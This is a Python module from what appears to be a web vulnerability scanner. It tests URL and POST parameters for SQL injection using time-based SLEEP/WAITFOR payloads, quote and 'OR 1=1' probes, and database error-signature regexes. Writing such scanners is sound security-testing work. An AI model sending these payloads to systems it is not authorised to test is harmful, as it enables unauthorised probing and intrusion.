"""Falcon MAG Framework - SQL Injection Scanner (v2)

Fixes 2026-09-20:
  - Skips static resources (css/js/images)
  - Strong time-based verification (baseline + proportional sleep)
  - Requires REAL DB error signatures (not generic text)
"""
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import get_logger
from core.http_client import is_static_resource

log = get_logger("sqli")


# Strong DB error patterns (high-confidence only)
ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql_",
    r"mysqli?_fetch",
    r"unclosed quotation mark after the character string",
    r"ora-\d{4,5}:",
    r"postgresql.*error",
    r"pg_query\(\)",
    r"sqlite3\.operationalerror",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"java\.sql\.sqlsyntaxerrorexception",
    r"system\.data\.sqlclient",
    r"sqlstate\[",
    r"syntax error.*at or near",
]

# Time-based payloads (long, unique sleep)
SLEEP_PAYLOADS = [
    ("1' AND SLEEP(5)-- -", 5),
    ("1' AND PG_SLEEP(5)-- -", 5),
    ("1; WAITFOR DELAY '0:0:5'-- -", 5),
    ("1' AND SLEEP(5)#", 5),
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    '"',
    "')",
    "';",
    "1' OR '1'='1'-- -",
    "1' OR '1'='2'-- -",
]


def _inject(url, param, value):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _has_db_error(text: str) -> str:
    """Return the matched signature or empty string."""
    if not text:
        return ""
    lower = text.lower()
    for pattern in ERROR_SIGNATURES:
        if re.search(pattern, lower, re.IGNORECASE):
            return pattern
    return ""


def _measure_baseline(client, url, param):
    """Return the normal response time for this URL (in seconds)."""
    times = []
    for _ in range(2):
        # Use a benign value
        benign = _inject(url, param, "1")
        t0 = time.time()
        client.scan_request(benign)
        times.append(time.time() - t0)
    if not times:
        return 1.0
    return sum(times) / len(times)


def _extract_post_params(config):
    """Extract POST body params (form or JSON)."""
    params = []

    post_data = config.get("_post_data", "") or ""
    if post_data:
        try:
            parsed = parse_qs(post_data, keep_blank_values=True)
            for k, v in parsed.items():
                params.append((k, v[0] if v else "", False))
        except Exception:
            pass

    post_json = config.get("_post_json", "") or ""
    if post_json:
        try:
            import json as _json
            data = _json.loads(post_json)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, str(v), True))
        except Exception:
            pass

    return params



def _collect_target_params(config, target):
    """Collect params from URL + discovered_params + crawled URLs."""
    from urllib.parse import urlparse, parse_qs

    params = {}

    # URL params
    parsed = urlparse(target)
    for p in parse_qs(parsed.query, keep_blank_values=True):
        params[p] = target

    # Discovered params → assume they go on the target URL
    for p in (config.get("_discovered_params", []) or [])[:10]:
        if p not in params:
            params[p] = target

    # Crawled URLs
    crawl = config.get("_crawl_result", {}) or {}
    for page in crawl.get("pages", []) or []:
        url = page if isinstance(page, str) else (page.get("url") if isinstance(page, dict) else None)
        if not url or "?" not in url:
            continue
        parsed = urlparse(url)
        for p in parse_qs(parsed.query, keep_blank_values=True):
            if p not in params:
                params[p] = url

    return params



def run(client, config):
    target = config.get("target", "")
    if not target:
        return {"error": "No target"}

    # Skip static files entirely
    if is_static_resource(target):
        log.info("SQLi check on " + target)
        log.info("  Skipped (static resource)")
        return {"target": target, "url": target, "tested": 0, "vulnerable": [],
                "skipped": "static_resource"}

    log.info("SQLi check on " + target)
    result = {"target": target, "url": target, "tested": 0, "vulnerable": []}

    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # === ADDED: inject discovered params ===
    discovered = config.get("_discovered_params", []) or []
    if discovered:
        # If target has no params, build test URLs from discovered params
        if not qs:
            # Use the first discovered param
            first_param = discovered[0]
            sep = "?" if "?" not in target else "&"
            target_with_param = target + sep + first_param + "=1"
            # Re-parse to populate qs
            parsed = urlparse(target_with_param)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            # Keep both URLs so we test with the original target too
            target = target_with_param
            log.info(f"  Testing discovered param: {first_param}")
        # Add more discovered params if there's already a query
        else:
            for param in discovered[:5]:
                if param not in qs:
                    qs[param] = ["1"]
            log.info(f"  Added {min(5, len(discovered))} discovered params")

    if not qs:
        log.info("  No URL parameters to test")

    # Get baseline (normal response time)
    baseline = client.scan_request(target)
    if not baseline or baseline.status == 0:
        return result

    # ==========================================================
    # URL params testing
    # ==========================================================
    if qs:
        for param in qs:
            # Skip suspicious param names (CDN cache busters)
            if param.lower() in ("v", "_v", "ver", "version", "cb", "cache", "ts"):
                log.debug(f"  Skipped cache-buster param: {param}")
                continue

            # Baseline for this param
            base_time = _measure_baseline(client, target, param)
            log.debug(f"  Baseline for {param}: {base_time:.2f}s")

            # --- 1) Time-based (high confidence) ---
            for payload, expected_sleep in SLEEP_PAYLOADS:
                result["tested"] += 1
                test_url = _inject(target, param, payload)
                t0 = time.time()
                resp = client.scan_request(test_url)
                elapsed = time.time() - t0

                if not resp:
                    continue

                # Require delay >= expected_sleep - 0.5 AND at least 2x baseline + 3s
                threshold = max(expected_sleep - 0.5, base_time * 2 + 3)

                if elapsed >= threshold:
                    # === DOUBLE VERIFICATION (ADDED 2026-09-20) ===
                    # Run the same payload again to rule out network jitter
                    log.info(f"  Suspected SQLi delay — verifying...")
                    time.sleep(0.5)
                    t1 = time.time()
                    client.scan_request(test_url)
                    elapsed2 = time.time() - t1

                    # Both runs must be slow
                    if elapsed2 < threshold * 0.8:
                        log.info(f"  ✗ Rejected: second run {elapsed2:.2f}s < threshold {threshold:.2f}s (jitter)")
                        continue

                    elapsed = min(elapsed, elapsed2)  # use the faster one

                if elapsed >= threshold:
                    log.warning(f"  SQLi (time-based) in '{param}' — {elapsed:.2f}s+{elapsed2:.2f}s (baseline {base_time:.2f}s)")
                    result["vulnerable"].append({
                        "url": target,
                        "original_url": target,
                        "injected_url": test_url,
                        "test_url": test_url,
                        "param": param,
                        "payload": payload,
                        "type": "time-based",
                        "db_error": f"delayed {elapsed:.2f}s",
                        "delay_ms": round(elapsed * 1000, 2),
                        "severity": "critical",
                    })
                    break

            # --- 2) Error-based (if not already found) ---
            already_found = any(v.get("param") == param for v in result["vulnerable"])
            if not already_found:
                for payload in ERROR_PAYLOADS:
                    result["tested"] += 1
                    test_url = _inject(target, param, payload)
                    resp = client.scan_request(test_url)
                    if not resp:
                        continue

                    sig = _has_db_error(resp.text)
                    if sig:
                        log.warning(f"  SQLi (error-based) in '{param}' — {sig}")
                        result["vulnerable"].append({
                            "url": target,
                            "original_url": target,
                            "injected_url": test_url,
                            "test_url": test_url,
                            "param": param,
                            "payload": payload,
                            "type": "error-based",
                            "db_error": sig,
                            "delay_ms": 0,
                            "severity": "critical",
                        })
                        break

    # ==========================================================
    # POST body scanning
    # ==========================================================
    post_params = _extract_post_params(config)
    if post_params:
        log.info(f"  {len(post_params)} POST parameter(s) to test")

        for param_name, orig_value, is_json in post_params:
            for payload, expected_sleep in SLEEP_PAYLOADS:
                result["tested"] += 1
                t0 = time.time()
                try:
                    if is_json:
                        import json as _json
                        body = _json.loads(config.get("_post_json", "{}"))
                        body[param_name] = payload
                        resp = client.request("POST", target, json=body)
                    else:
                        parsed_data = parse_qs(config.get("_post_data", ""), keep_blank_values=True)
                        parsed_data[param_name] = [payload]
                        new_body = urlencode(parsed_data, doseq=True)
                        resp = client.request("POST", target, data=new_body)
                except Exception as e:
                    log.debug("POST inject failed: " + str(e))
                    continue
                elapsed = time.time() - t0

                if not resp:
                    continue

                if elapsed >= expected_sleep - 0.5:
                    log.warning(f"  SQLi (POST time-based) in '{param_name}' — {elapsed:.2f}s")
                    result["vulnerable"].append({
                        "url": target, "original_url": target,
                        "injected_url": target, "test_url": target,
                        "param": param_name, "payload": payload,
                        "type": "time-based", "db_error": f"delayed {elapsed:.2f}s",
                        "delay_ms": round(elapsed * 1000, 2),
                        "method": "POST", "severity": "critical",
                    })
                    break

    if not result["vulnerable"]:
        log.info(f"  No SQLi found ({result['tested']} tested)")

    return result
